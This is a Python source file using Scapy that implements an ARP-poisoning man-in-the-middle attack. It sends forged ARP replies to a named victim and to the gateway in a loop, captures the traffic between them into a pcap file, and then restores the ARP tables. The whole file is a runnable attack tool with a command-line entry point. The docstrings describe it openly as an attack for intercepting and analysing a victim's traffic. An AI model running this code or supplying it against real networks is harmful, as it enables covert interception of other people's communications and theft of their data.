from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, send, sniff, srp, wrpcap)
import os
import sys
import time

def get_mac(target_ip):
    """
    Get the MAC address of a target IP address using ARP requests.

    Args:
        target_ip (str): The IP address to resolve.

    Returns:
        str: MAC address of the target IP, or None if not found.
    """
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, verbose=False)
    for r, _ in resp:
        return r[Ether].src
    return None

class ARPer:
    """
    This class is used to perform a Man-in-the-Middle (MITM) attack using ARP poisoning.

    It sends forged ARP packets to the victim and the gateway, making them believe that
    the attacker's machine is the other party. As a result, all the traffic between the
    victim and the gateway is routed through the attacker's machine.

    The attacker can then sniff and analyze the traffic between the two nodes.

    Attributes:
        victim (str): Victim IP address.
        victim_mac (str): Victim MAC address obtained via ARP request.
        gateway (str): Gateway IP address.
        gateway_mac (str): Gateway MAC address obtained via ARP request.
        iface (str): Network interface used for sending and sniffing packets.
        poison_thread (multiprocessing.Process): Process that runs ARP poisoning.
        sniff_thread (multiprocessing.Process): Process that captures network packets.
    """
    
    def __init__(self, victim, gateway, iface="eno1"):
        self.victim = victim
        self.victim_mac = get_mac(victim)

        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)

        self.iface = iface
        conf.iface = iface
        conf.verb = 0

        print(f"\nInterface set to {iface}\n")
        print(f"Victim ({victim}) is at {self.victim_mac}")
        print(f"Gateway ({gateway}) is at {self.gateway_mac}")
        print("-" * 40)

    def run(self):
        """
        Start ARP poisoning and packet sniffing.
        """
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        """
        Continuously send spoofed ARP packets to victim and gateway to perform ARP poisoning.
        """
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)

        print("ARP packets prepared for spoofing:")
        print(f"[Victim] Src IP: {poison_victim.psrc}, Dst IP: {poison_victim.pdst}, Dst MAC: {poison_victim.hwdst}")
        print("-" * 40)
        print(f"[Gateway] Src IP: {poison_gateway.psrc}, Dst IP: {poison_gateway.pdst}, Dst MAC: {poison_gateway.hwdst}")
        print("-" * 40)
        print("Starting ARP spoofing... [CTRL + C to stop]\n")

        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
            except KeyboardInterrupt:
                print("\n\nStopping ARP poisoning...")
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        """
        Sniff packets between the victim and the gateway.

        Args:
            count (int): Number of packets to capture (default: 100).
        """
        time.sleep(5)  # Wait 5 seconds before starting sniffing
        print(f"Capturing {count} packets...")

        bpf_filter = f"ip host {self.victim} or ip host {self.gateway}"

        packets = sniff(iface=conf.iface, filter=bpf_filter, count=count)
        wrpcap("arp_poisoning.pcap", packets)

        print(f"Packets captured and saved to arp_poisoning.pcap")

        self.restore()
        self.poison_thread.terminate()
        print("Done!\n")

    def restore(self):
        """
        Restore the ARP tables of the victim and the gateway.
        """
        print("Restoring ARP tables...")

        restore_victim = ARP(op=2, psrc=self.gateway, hwsrc=self.gateway_mac,
                             pdst=self.victim, hwdst="ff:ff:ff:ff:ff:ff")
        restore_gateway = ARP(op=2, psrc=self.victim, hwsrc=self.victim_mac,
                              pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff")

        send(restore_victim, count=5, verbose=False)
        send(restore_gateway, count=5, verbose=False)

        print("ARP tables restored.")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arper.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim_ip, gateway_ip, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    arper = ARPer(victim_ip, gateway_ip, interface)
    arper.run()